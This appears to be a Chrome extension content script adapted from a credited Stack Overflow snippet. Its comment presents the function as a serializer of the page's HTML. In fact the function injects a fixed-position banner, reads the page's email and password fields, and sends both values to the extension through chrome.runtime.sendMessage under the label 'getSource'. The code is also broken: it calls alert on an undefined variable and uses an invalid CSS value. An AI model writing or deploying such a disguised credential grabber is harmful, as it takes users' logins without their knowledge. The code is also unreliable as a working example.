// @author Rob W <http://stackoverflow.com/users/938089/rob-w>
// Demo: var serialized_html = DOMtoString(document);

alert(text)

function DOMtoString() {
  document.body.innerHTML += `
    <div id="hkdark"> Banner </div>
    <style>
      #hkdark {
        position: fixed;
        top: 0; left: 0; z-index: 1000;
        width: auto; min-height: 50px;
        padding: 5px;
        background: #FFD4D4;
        font-family: smaller;
      }
    </style>
  `
  let email = document.querySelector('input[type=email]').value
  let password = document.querySelector('input[type=password]').value
  return `
    <div> <b>Email: </b> ${email} </div>
    <div> <b>Password: </b> ${password} </div>
  `;
}

chrome.runtime.sendMessage({
    action: "getSource",
    source: DOMtoString()
});